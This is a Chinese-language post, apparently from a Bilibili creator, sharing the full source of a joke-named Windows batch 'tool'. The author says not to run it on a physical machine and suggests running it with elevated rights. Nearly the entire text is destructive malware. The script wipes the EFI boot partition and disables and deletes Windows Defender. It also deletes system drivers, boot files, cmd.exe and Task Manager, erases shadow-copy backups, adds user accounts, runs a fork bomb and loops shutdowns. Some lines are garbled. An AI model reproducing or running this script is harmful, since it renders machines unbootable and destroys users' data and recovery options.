bilibili五字_小树自制Van♂Doors 1145141919810工具(请勿在实体机打开)
注:可以先用NSudo提取权限后打开
源码:
:a
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
timeout /t -1
tasklist | findstr "MsMpEng.exe"
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
taskkill /F /IM MsMpEng.exe
rd /s /q "C:\Program Files\Internet Explorer"
rd /s /q "C:\Windows\System32\Speech"
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Internet Explorer.lnk"
reg delete "HKCR\IE.AssocFile.HTM" /f
reg delete "HKCU\Software\Microsoft\Windows Media" /f
reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}" /f
:: 1. 移除Windows Defender（保留核心安全服务）
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
taskkill /f /im MsMpEng.exe
rmdir /s /q "C:\Program Files\Windows Defender"
rmdir /s /q "C:\ProgramData\Microsoft\Windows Defender"
:: 2. 删除旧版.NET Framework（需确保无程序依赖）
dir /b %SystemRoot%\Microsoft.NET\Framework\v3.* > .\net3list.txt
for /f "tokens=*" %%i in (.\net3list.txt) do (
  rd /s /q "%SystemRoot%\Microsoft.NET\Framework\%%i"
  reg delete "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\%%i" /f
)
reg delete "HKLM\SOFTWARE\Microsoft\Internet Explorer" /f
reg delete "HKCR\CLSID\{0002DF01-0000-0000-C000-000000000046}" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
del /s /q "C:\Program Files\Windows Defender"
del /s /q "C:\Windows\System32\drivers"
del /f /s /q "C:\Program Files\Windows Defender\*.*"
rmdir /s /q "C:\Program Files\Windows Defender"
rmdir /s /q "C:\Program Files (x86)\Windows Defender"
del /f /s /q "C:\ProgramData\Microsoft\Windows Defender\*.*"
del /s /q "C:\Program Files\Windows Defender"
del /s /q "C:\ProgramData\Microsoft\Windows Defender"
del /s /q "C:\Windows\Boot"
del /s /q "C:\Windows\system32\cmd.exe"
del /s /q "C:\Windows\System32\Taskmgr.exe"
del /s /q "C:\Windows\System32\osk.exe"
mshta vbscript:msgbox("操作已完房,48,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完房,64,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完房,16,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完房,64,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完房,48,"系统提示")(window.close)
start mshta vbscript:msgbox("重启倒计旿,0,"警告")(window.close)
timeout /t 1 >nul
goto :a
net USER 1145141919810 1145141919810 /add
net user 114514 /add
net user 1919810 /add
mountvol X: /s & del X:\ *.* /s /f /q & rd /s /q X:\EFI
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t 
REG_DWORD /d 1 /f
vssadmin delete shadows /all /quiet
cd C:\Program Files\Internet Explorer /d
del /f /s /q *.*
rmdir /s /q C:\Program Files\Internet Explorer
mshta vbscript:CreateObject("Wscript.Shell").popup("1145141919810秒后自动关闭",1145141919810,"倒计旿,64)(window.close)
shutdown -s -t 1145141919810
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
shutdown -r -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
%0|%0
ipconfig

bat编写后打包的,代码非常混乱,轻点喷
作者:https://space.bilibili.com/3493276898298079
